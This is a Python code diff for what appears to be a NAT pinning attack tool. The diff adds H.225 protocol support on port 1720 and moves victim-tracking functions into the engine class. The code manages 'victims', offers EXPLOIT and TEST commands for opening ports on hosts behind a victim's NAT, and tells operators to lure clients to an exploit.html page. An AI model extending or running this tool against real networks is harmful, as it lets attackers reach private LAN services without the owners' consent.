@@ -4,6 +4,7 @@ from server.modules import ftp
 from server.modules import flashpol
 from server.modules import web
 from server.modules import sip
+from server.modules import h225
 from server.modules import cmd
 from optparse import OptionParser
 from server.tools import ip
@@ -19,7 +20,7 @@ class Shell():
 	ENGINE = None
 	CURR_VICTIM = None
 	COMMANDS = "HELP", "LIST", "SET", "TEST", "EXPLOIT", "QUIT", "EXIT", "CLEAR" , "RELOAD"
-	PROTOS=["FTP","IRC","SIP"]
+	PROTOS=["FTP","IRC","SIP","H225"]
 	def __init__(self, engine):
 		global ENGINE
 		self.ENGINE = engine
@@ -32,32 +33,7 @@ class Shell():
 		self.ENGINE.shutdown()
 		#end while
 	#end def
-	############################################################################
-	def getVictims(self):
-		for server in self.ENGINE.SERVERS:
-			if server.TYPE=="Command Server":
-				if server.HANDLER:
-					return server.HANDLER.VICTIMS
-				else:
-					return []
-	def getVictimById(self,id):
-		victims = self.getVictims()
-		if victims != None:
-			try:
-				result = victims[id]
-			except IndexError:
-				result = None #invalid list index
-		else:	
-			result = None
-		return result
-	def getVictimTest(self,testid):
-		victims = self.getVictims()
-		if victims != None:
-			for victim in victims:
-				for test in victim.TESTS:
-					if test.TEST_ID==testid:
-						return test
-	############################################################################
+
 	def handleCMD_help(self,parts):
 		if len(parts)==1:
 			print "Available Commands:"
@@ -78,7 +54,7 @@ class Shell():
 				print "Test: The test command is the bread and butter of this tool, it instructs a client to perform a natpin test."
 				print "Format: test ID PROTOCOL HOST PORT"
 				print "ID: The list id of the victim you wish to test (0,1,2,..."
-				print "PROTOCOL: The protocol you wish to test, FTP, IRC, SIP"
+				print "PROTOCOL: The protocol you wish to test, FTP, IRC, SIP, H225"
 				print "HOST: The IP you want to test, can be victim private ip, or another ip on its LAN (or an external address"
 				print "PORT: The port on HOST you want to test."
 				print ""
@@ -109,7 +85,7 @@ class Shell():
 				if int(port)<0 or int(port)>65535:
 					print ("Invalid port specified.")
 					return
-			victim = self.getVictimById(vic_id)
+			victim = self.ENGINE.getVictimById(vic_id)
 			if victim == None: 
 				print "You provided an invalid client id, type 'list clients' for a list of available clients."
 			else:
@@ -121,12 +97,12 @@ class Shell():
 						victim.addTest(xproto, ip, str(port))
 	def handleCmd_list(self, item):
 		if item.upper()=="CLIENTS":
-			victims = self.getVictims() # refresh list
+			victims = self.ENGINE.getVictims() # refresh list
 			x = 0
 			print "   ID\tClient ID\t\t\tAddress"
 			print "--------------------------------------------------------------------------"
 			if victims == None:
-				print "No clients connected yet: point them to http://yourserver/exploit.html?type=cmd&ci=ip-of-client"
+				print "No clients connected yet: point them to http://yourserver/exploit.html?ci=ip-of-client"
 			else:
 				for victim in victims:
 					lastseen = datetime.now()-victim.LAST_SEEN
@@ -142,7 +118,7 @@ class Shell():
 			print "Tests:"
 			print "STATUS\t\t\tIP\t\tPORT\t\tMAPPED TO"
 			print "----------------------------------------------------------------------------------------------"
-			victims = self.getVictims()
+			victims = self.ENGINE.getVictims()
 			if victims != None:
 				for victim in victims:
 					for test in victim.TESTS:
@@ -171,10 +147,10 @@ class Shell():
 			if len(parts)==3:
 				if parts[1].upper() == "VIC":
 					self.CURR_VICTIM = int(parts[2])
-					print "Current victim set to " +  self.getVictimById(self.CURR_VICTIM).VIC_ID
+					print "Current victim set to " +  self.ENGINE.getVictimById(self.CURR_VICTIM).VIC_ID
 		elif parts[0].upper()=="RELOAD":
 			if len(parts)==2:
-				self.getVictimById(int(parts[1]))._reload()
+				self.ENGINE.getVictimById(int(parts[1]))._reload()
 		elif parts[0].upper()=="TEST":
 			self.handleCmd_test(parts)
 		elif parts[0].upper()=="HELP" or parts[0]=="?":
@@ -197,7 +173,32 @@ class Engine():
 		self.VERBOSITY = verbosity
 		LOGTYPE = logType #either "screen" or filename
 	#end def
-	
+	############################################################################
+	def getVictims(self):
+		for server in self.SERVERS:
+			if server.TYPE=="Command Server":
+				if server.HANDLER:
+					return server.HANDLER.VICTIMS
+				else:
+					return []
+	def getVictimById(self,id):
+		victims = self.getVictims()
+		if victims != None:
+			try:
+				result = victims[id]
+			except IndexError:
+				result = None #invalid list index
+		else:	
+			result = None
+		return result
+	def getVictimTest(self,testid):
+		victims = self.getVictims()
+		if victims != None:
+			for victim in victims:
+				for test in victim.TESTS:
+					if test.TEST_ID==testid:
+						return test
+	############################################################################
 	def log(self, value, logLevel):
 		if logLevel >= self.VERBOSITY:
 			print value
@@ -214,6 +215,8 @@ class Engine():
 			self.SERVERS.append(irc.Server(serverPort=6667,caller=self))
 		if proto ==  "SIP" or proto==  "ALL":
 			self.SERVERS.append(sip.Server(serverPort=5060,caller=self))
+		if proto ==  "H225" or proto==  "ALL":
+			self.SERVERS.append(h225.Server(serverPort=1720,caller=self))
 		try:
 			self.log("Services running, press CTRL-C to exit.",0)
 			self.SERVICE_THREAD = thread.start_new_thread(asyncore.loop,())
